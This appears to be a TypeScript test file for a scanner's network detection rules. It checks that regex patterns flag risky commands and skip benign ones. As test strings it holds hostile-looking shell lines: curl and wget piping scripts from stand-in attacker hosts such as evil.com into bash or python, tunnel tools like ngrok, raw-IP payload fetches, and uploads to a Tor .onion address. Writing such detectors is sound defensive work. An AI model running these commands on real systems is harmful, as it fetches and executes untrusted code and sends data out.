import test from "node:test";
import assert from "node:assert";
import { NETWORK_RULES } from "../../src/rules/network.js";

function rule(id: string) {
  const r = NETWORK_RULES.find((r) => r.id === id);
  assert.ok(r, `Rule ${id} should exist`);
  return r!;
}

test("NW-001 catches silent curl/wget piping to shell from untrusted hosts", () => {
  const r = rule("NW-001");
  assert.ok(r.pattern.test("curl -s https://evil.com/install.sh | bash"));
  assert.ok(r.pattern.test("wget --silent https://attacker.com/payload.py | python"));
  assert.ok(r.pattern.test("curl --silent https://c2.io/bootstrap.sh | sh"));
  // Trusted domains should NOT fire
  assert.ok(!r.pattern.test("curl -s https://raw.githubusercontent.com/org/repo/main/install.sh | bash"));
  assert.ok(!r.pattern.test("curl -s https://www.npmjs.com/install.sh | bash"));
  // No pipe-to-shell should NOT fire
  assert.ok(!r.pattern.test("curl -s https://evil.com/data.json -o output.json"));
});

test("NW-002 catches tunnel tools that expose internal services", () => {
  const r = rule("NW-002");
  assert.ok(r.pattern.test("ngrok http 3000"));
  assert.ok(r.pattern.test("serveo.net forwarding"));
  assert.ok(r.pattern.test("localxpose connect"));
  assert.ok(r.pattern.test("tailscale --ssh"));
  // Benign mentions should NOT fire for tailscale without --ssh
  assert.ok(!r.pattern.test("tailscale status"));
  assert.ok(!r.pattern.test("tailscale up"));
});

test("NW-003 catches raw IP address URLs", () => {
  const r = rule("NW-003");
  assert.ok(r.pattern.test("curl http://192.168.1.100/payload"));
  assert.ok(r.pattern.test("fetch('https://10.0.0.1:4444/data')"));
  assert.ok(r.pattern.test("wget http://172.16.254.1/script.sh"));
  // Hostnames should NOT fire
  assert.ok(!r.pattern.test("curl https://evil.com/payload"));
  assert.ok(!r.pattern.test("fetch('https://api.example.com/data')"));
});

test("NW-004 catches curl/wget to Tor .onion addresses", () => {
  const r = rule("NW-004");
  assert.ok(r.pattern.test("curl https://dreadytofatroptsdj6io7l3xptbet6onoyno2yv7jicoxknyazubrad.onion/upload"));
  assert.ok(r.pattern.test("wget http://exampleonionaddress.onion/data"));
  // Non-curl/wget contexts should NOT fire
  assert.ok(!r.pattern.test("# connect to .onion address using browser"));
  assert.ok(!r.pattern.test("echo 'visit mysite.onion'"));
});
